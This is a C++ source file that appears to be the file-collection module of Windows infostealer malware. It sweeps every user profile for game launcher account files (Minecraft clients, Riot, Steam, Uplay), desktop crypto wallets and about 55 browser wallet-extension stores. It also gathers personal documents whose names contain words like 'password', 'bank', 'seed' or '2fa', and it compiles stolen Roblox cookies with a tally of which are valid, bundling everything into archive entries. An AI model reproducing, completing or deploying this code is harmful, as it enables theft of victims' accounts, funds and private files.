#include "collectors.hpp"

#include "util.hpp"

#include <windows.h>

#include <algorithm>
#include <cctype>
#include <cstdio>
#include <filesystem>
#include <map>
#include <set>
#include <string>
#include <vector>

namespace ariel::collectors {

namespace {

namespace fs = util::fs;

constexpr size_t kMaxFile = 8u * 1024u * 1024u;
constexpr size_t kMaxTreeFiles = 400;
constexpr size_t kMaxTreeDepth = 8;
constexpr size_t kMaxCommonFiles = 500;
constexpr size_t kMaxCommonScan = 200000;
constexpr size_t kMaxCommonDepth = 6;

std::vector<fs::path> users() {
    std::vector<fs::path> result;
    const fs::path root("C:\\Users");
    std::error_code error;
    if (!fs::exists(root, error)) return result;
    for (fs::directory_iterator it(root, error), end; it != end; it.increment(error)) {
        if (error) break;
        const std::string name = util::lower(it->path().filename().string());
        if (name == "public" || name == "default" || name == "default user" ||
            name == "all users")
            continue;
        if (it->is_directory(error)) result.push_back(it->path());
    }
    return result;
}

std::string user_name(const fs::path& user) {
    return util::narrow_path(user.filename());
}

bool add_file(std::vector<archive::entry>& out, const fs::path& source,
              const std::string& name) {
    std::error_code error;
    if (!fs::exists(source, error) || !fs::is_regular_file(source, error)) return false;
    if (fs::file_size(source, error) > kMaxFile || error) return false;
    std::vector<uint8_t> bytes;
    if (!util::read_file(source, bytes) || bytes.empty()) return false;
    out.push_back({name, std::move(bytes)});
    return true;
}

void add_tree(std::vector<archive::entry>& out, const fs::path& source,
              const std::string& prefix) {
    std::error_code error;
    if (!fs::exists(source, error)) return;
    if (fs::is_regular_file(source, error)) {
        add_file(out, source, prefix);
        return;
    }
    if (!fs::is_directory(source, error)) return;
    size_t added = 0;
    for (fs::recursive_directory_iterator it(source, fs::directory_options::skip_permission_denied,
                                              error),
         end;
         it != end; it.increment(error)) {
        if (error) break;
        if (it.depth() >= kMaxTreeDepth) {
            it.disable_recursion_pending();
            continue;
        }
        const auto status = it->symlink_status(error);
        if (error || fs::is_symlink(status)) {
            it.disable_recursion_pending();
            continue;
        }
        if (!fs::is_regular_file(status)) continue;
        const std::string relative = util::narrow_path(fs::relative(it->path(), source));
        if (add_file(out, it->path(), prefix + "/" + relative)) ++added;
        if (added >= kMaxTreeFiles) break;
    }
}

std::string unique_name(const std::string& name, std::set<std::string>& used) {
    if (used.insert(name).second) return name;
    for (int i = 1; i < 1000; ++i) {
        const std::string candidate = name + "_" + std::to_string(i);
        if (used.insert(candidate).second) return candidate;
    }
    return name;
}

const std::vector<std::pair<std::string, std::string>> kGameFiles = {
    {"Epic Games Settings", "AppData/Local/EpicGamesLauncher/Saved/Config/Windows/GameUserSettings.ini"},
    {"Minecraft Intent", "intentlauncher/launcherconfig"},
    {"Minecraft Lunar", ".lunarclient/settings/game/accounts.json"},
    {"Minecraft TLauncher", "AppData/Roaming/.minecraft/TlauncherProfiles.json"},
    {"Minecraft Feather", "AppData/Roaming/.feather/accounts.json"},
    {"Minecraft Meteor", "AppData/Roaming/.minecraft/meteor-client/accounts.nbt"},
    {"Minecraft Impact", "AppData/Roaming/.minecraft/Impact/alts.json"},
    {"Minecraft Novoline", "AppData/Roaming/.minecraft/Novoline/alts.novo"},
    {"Minecraft CheatBreakers", "AppData/Roaming/.minecraft/cheatbreaker_accounts.json"},
    {"Minecraft Microsoft", "AppData/Roaming/.minecraft/launcher_accounts_microsoft_store.json"},
    {"Minecraft Rise", "AppData/Roaming/.minecraft/Rise/alts.txt"},
    {"Minecraft Rise Intent", "intentlauncher/Rise/alts.txt"},
    {"Minecraft Paladium", "AppData/Roaming/paladium-group/accounts.json"},
    {"Minecraft PolyMC", "AppData/Roaming/PolyMC/accounts.json"},
    {"Minecraft Badlion", "AppData/Roaming/Badlion Client/accounts.json"},
};

const std::vector<std::pair<std::string, std::string>> kGameDirs = {
    {"Riot Config", "AppData/Local/Riot Games/Riot Client/Config"},
    {"Riot Data", "AppData/Local/Riot Games/Riot Client/Data"},
    {"Riot Logs", "AppData/Local/Riot Games/Riot Client/Logs"},
    {"Uplay", "AppData/Local/Ubisoft Game Launcher"},
    {"NationsGlory", "AppData/Roaming/NationsGlory/Local Storage/leveldb"},
};

const std::vector<std::pair<std::string, std::string>> kWalletDirs = {
    {"Zcash", "Zcash"},
    {"Armory", "Armory"},
    {"Bytecoin", "bytecoin"},
    {"Jaxx", "com.liberty.jaxx/IndexedDB/file__0.indexeddb.leveldb"},
    {"Exodus", "Exodus/exodus.wallet"},
    {"Ethereum", "Ethereum/keystore"},
    {"Electrum", "Electrum/wallets"},
    {"AtomicWallet", "atomic/Local Storage/leveldb"},
    {"Guarda", "Guarda/Local Storage/leveldb"},
    {"Coinomi", "Coinomi/Coinomi/wallets"},
};

const std::vector<std::pair<std::string, std::string>> kWalletExtensions = {
    {"Authenticator", "bhghoamapcdpbohphigoooaddinpkbai"},
    {"Binance", "fhbohimaelbohpjbbldcngcnapndodjp"},
    {"Bitapp", "fihkakfobkmkjojpchpfgcmhfjnmnfpi"},
    {"BoltX", "aodkkagnadcbobfpggfnjeongemjbjca"},
    {"Coin98", "aeachknmefphepccionboohckonoeemg"},
    {"Coinbase", "hnfanknocfeofbddgcijnmhnfnkdnaad"},
    {"Core", "agoakfejjabomempkjlepdflaleeobhb"},
    {"Crocobit", "pnlfjmlcjdjgkddecgincndfgegkecke"},
    {"Equal", "blnieiiffboillknjnepogjhkgnoapac"},
    {"Ever", "cgeeodpfagjceefieflmdfphplkenlfk"},
    {"ExodusWeb3", "aholpfdialjgjfhomihkjbmgjidlcdno"},
    {"Fewcha", "ebfidpplhabeedpnhjnobghokpiioolj"},
    {"Finnie", "cjmkndjhnagcfbpiemnkdpomccnjblmj"},
    {"GuardaWeb", "hpglfhgfnhbgpjdenjgmdgoeiappafln"},
    {"Guild", "nanjmdknhkinifnkgdcggcfnhdaammmj"},
    {"Harmony", "fnnegphlobjdpkhecapkijjdkgcjhkib"},
    {"Iconex", "flpiciilemghbmfalicajoolhkkenfel"},
    {"Jaxx Liberty", "cjelfplplebdjjenllpjcblmjkfcffne"},
    {"Kaikas", "jblndlipeogpafnldhgmapagcccfchpi"},
    {"KardiaChain", "pdadjkfkgcafgbceimcpbkalnfnepbnk"},
    {"Keplr", "dmkamcknogkgcdfhhbddcghachkejeap"},
    {"Liquality", "kpfopkelmapcoipemfendmdcghnegimn"},
    {"MaiarDEFI", "dngmlblcodfobpdpecaadgfbcggfjfnm"},
    {"Martian", "efbglgofoippbgcjepnhiblaibcnclgk"},
    {"Math", "afbcbjpbpfadlkmhmclhkeeodmamcflc"},
    {"Metamask", "nkbihfbeogaeaoehlefnkodbefgpgknn"},
    {"Metamask2", "ejbalbakoplchlghecdalmeeeajnimhm"},
    {"Mobox", "fcckkdbjnoikooededlapcalpionmalo"},
    {"Nami", "lpfcbjknijpeeillifnkikgncikgfhdo"},
    {"Nifty", "jbdaocneiiinmjbjlgalhcelgbejmnid"},
    {"Oxygen", "fhilaheimglignddkjgofkcbgekhenbh"},
    {"PaliWallet", "mgffkfbidihjpoaomajlbgchddlicgpn"},
    {"Petra", "ejjladinnckdgjemekebdpeokbikhfci"},
    {"Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa"},
    {"Pontem", "phkbamefinggmakgklpkljjmgibohnba"},
    {"Ronin", "fnjhmkhhmkbjkkabndcnnogagogbneec"},
    {"Safepal", "lgmpcpglpngdoalbgeoldeajfclnhafa"},
    {"Saturn", "nkddgncdjgjfcddamfgcmfnlhccnimig"},
    {"Slope", "pocmplpaccanhmnllbbkpgfliimjljgo"},
    {"Solfare", "bhhhlbepdkbapadjdnnojkbgioiodbic"},
    {"Sollet", "fhmfendgdocmcbmfikdcogofphimnkno"},
    {"Starcoin", "mfhbebgoclkghebffdldpobeajmbecfk"},
    {"Swash", "cmndjbecilbocjfkibfbifhngkdmjgog"},
    {"TempleTezos", "ookjlbkiijinhpmnjffcofjonbfbgaoc"},
    {"TerraStation", "aiifbnbfobpmeekipheeijimdpnlpgpp"},
    {"Tokenpocket", "mfgccjchihfkkindfppnaooecgfneiii"},
    {"Ton", "nphplpgoakhhjchkkhmiggakijnkhfnd"},
    {"Tron", "ibnejdfjmmkpcnlpebklmnkoeoihofec"},
    {"Trust Wallet", "egjidjbpglichdcondbcbdnbeeppgdph"},
    {"Wombat", "amkmjjmmflddogmhpjloimipbofnfjih"},
    {"XDEFI", "hmeobnfnfcmdkdcmlblgagmfpfboieaf"},
    {"XMR.PT", "eigblbgjknlfbajkfhopmcojidlgcehm"},
    {"XinPay", "bocpokimicclpaiekenaeelehdjllofo"},
    {"Yoroi", "ffnbelfdoeiohenkjibnmadjiehjhajb"},
    {"iWallet", "kncchdigobghenbbaddojjnnaogfppfj"},
};

const std::vector<std::string> kBrowserUserData = {
    "AppData/Local/Google/Chrome/User Data",
    "AppData/Local/Microsoft/Edge/User Data",
    "AppData/Local/BraveSoftware/Brave-Browser/User Data",
    "AppData/Local/Vivaldi/User Data",
    "AppData/Roaming/Opera Software/Opera Stable",
    "AppData/Roaming/Opera Software/Opera GX Stable",
};

const std::vector<std::string> kFileExtensions = {
    ".txt", ".log", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".odt", ".pdf", ".rtf", ".json", ".csv", ".db", ".jpg", ".jpeg",
    ".png", ".gif", ".webp", ".mp4",
};

const std::vector<std::string> kFileKeywords = {
    "account", "password", "secret", "mdp", "motdepass", "mot_de_pass",
    "login", "paypal", "banque", "bancaire", "bank", "metamask", "wallet",
    "crypto", "exodus", "atomic", "auth", "mfa", "2fa", "code", "memo",
    "compte", "token", "credit", "card", "mail", "address", "phone",
    "permis", "number", "backup", "database", "config", "seed",
};

}  // namespace

std::vector<archive::entry> games() {
    std::vector<archive::entry> out;
    for (const auto& user : users()) {
        const std::string owner = user_name(user);
        for (const auto& item : kGameFiles)
            add_file(out, user / fs::path(item.second),
                     "games/" + owner + "/" + item.first + "/" +
                         fs::path(item.second).filename().string());
        for (const auto& item : kGameDirs)
            add_tree(out, user / fs::path(item.second),
                     "games/" + owner + "/" + item.first);
    }
    add_tree(out, "C:\\Program Files (x86)\\Steam\\config", "games/Steam/Config");
    add_tree(out, "C:\\Program Files\\Steam\\config", "games/Steam/Config");
    return out;
}

void games_into(std::vector<archive::entry>& out) {
    auto found = games();
    out.insert(out.end(), found.begin(), found.end());
}

std::vector<archive::entry> common_files() {
    std::vector<archive::entry> out;
    std::set<std::string> used;
    size_t scanned = 0;
    const std::vector<std::string> folders = {
        "Desktop", "Downloads", "Documents", "Videos", "Pictures", "Music", "OneDrive",
    };
    for (const auto& user : users()) {
        const std::string owner = user_name(user);
        for (const auto& folder : folders) {
            const fs::path root = user / fs::path(folder);
            std::error_code error;
            if (!fs::exists(root, error) || !fs::is_directory(root, error)) continue;
            for (fs::recursive_directory_iterator it(root, fs::directory_options::skip_permission_denied,
                                                      error),
                 end;
                 it != end; it.increment(error)) {
                if (error) break;
                if (++scanned >= kMaxCommonScan || out.size() >= kMaxCommonFiles) return out;
                if (it.depth() >= kMaxCommonDepth) {
                    it.disable_recursion_pending();
                    continue;
                }
                const auto status = it->symlink_status(error);
                if (error || fs::is_symlink(status)) {
                    it.disable_recursion_pending();
                    continue;
                }
                if (!fs::is_regular_file(status)) continue;
                const std::string name = util::lower(it->path().filename().string());
                if (fs::file_size(it->path(), error) > 2u * 1024u * 1024u || error) continue;
                bool wanted = false;
                for (const auto& keyword : kFileKeywords) {
                    if (name.find(keyword) == std::string::npos) continue;
                    for (const auto& extension : kFileExtensions) {
                        if (name.size() >= extension.size() &&
                            name.compare(name.size() - extension.size(), extension.size(),
                                         extension) == 0) {
                            wanted = true;
                            break;
                        }
                    }
                    if (wanted) break;
                }
                if (!wanted) continue;
                add_file(out, it->path(),
                         "commonfiles/" + owner + "/" +
                             unique_name(it->path().filename().string(), used));
            }
        }
    }
    return out;
}

void common_files_into(std::vector<archive::entry>& out) {
    auto found = common_files();
    out.insert(out.end(), found.begin(), found.end());
}

std::vector<archive::entry> wallets() {
    std::vector<archive::entry> out;
    for (const auto& user : users()) {
        const std::string owner = user_name(user);
        const fs::path roaming = user / "AppData" / "Roaming";
        for (const auto& item : kWalletDirs)
            add_tree(out, roaming / fs::path(item.second),
                     "wallets/" + owner + "/" + item.first);

        for (const auto& data : kBrowserUserData) {
            const fs::path base = user / fs::path(data);
            std::vector<fs::path> profiles;
            std::error_code error;
            if (fs::exists(base / "Default", error)) profiles.push_back(base / "Default");
            for (fs::directory_iterator it(base, fs::directory_options::skip_permission_denied,
                                           error),
                 end;
                 it != end; it.increment(error)) {
                if (error) break;
                const std::string name = it->path().filename().string();
                const auto status = it->symlink_status(error);
                if (error || fs::is_symlink(status)) continue;
                if (!fs::is_directory(status) || name == "Default" ||
                    util::lower(name).find("profile") == std::string::npos)
                    continue;
                profiles.push_back(it->path());
            }
            for (const auto& profile : profiles) {
                const fs::path settings = profile / "Local Extension Settings";
                for (const auto& item : kWalletExtensions)
                    add_tree(out, settings / fs::path(item.second),
                             "wallets/" + owner + "/extensions/" + item.first);
            }
        }
    }
    return out;
}

void wallets_into(std::vector<archive::entry>& out) {
    auto found = wallets();
    out.insert(out.end(), found.begin(), found.end());
}

std::vector<archive::entry> roblox_cookies(
    const std::vector<net::roblox_account>& accounts) {
    std::vector<archive::entry> out;
    if (accounts.empty()) return out;

    const auto as_bytes = [](const std::string& value) {
        return std::vector<uint8_t>(value.begin(), value.end());
    };

    std::string all = "Roblox cookies found in browsers\n";
    std::string valid = "Valid Roblox accounts\n";
    size_t valid_count = 0;
    for (const auto& account : accounts) {
        const std::string status = account.valid ? "valid" : "invalid";
        const std::string detail = account.refreshed ? "unlocked" : "original";
        const std::string line =
            status + " | " + detail + " | " + account.source + " | " + account.profile +
            " | " + account.username + " | " + account.display_name + " | " + account.id +
            " | " + (account.error.empty() ? "-" : account.error) + " | cookie=" +
            account.cookie + " | source=" + account.source_cookie + "\n";
        all += line;
        if (account.valid) {
            valid += line;
            ++valid_count;
        }
    }

    out.push_back({"games/Roblox/cookies.txt", as_bytes(all)});
    out.push_back({"games/Roblox/valid.txt",
                   as_bytes("valid: " + std::to_string(valid_count) + " of " +
                            std::to_string(accounts.size()) + "\n" + valid)});
    return out;
}

}  // namespace ariel::collectors
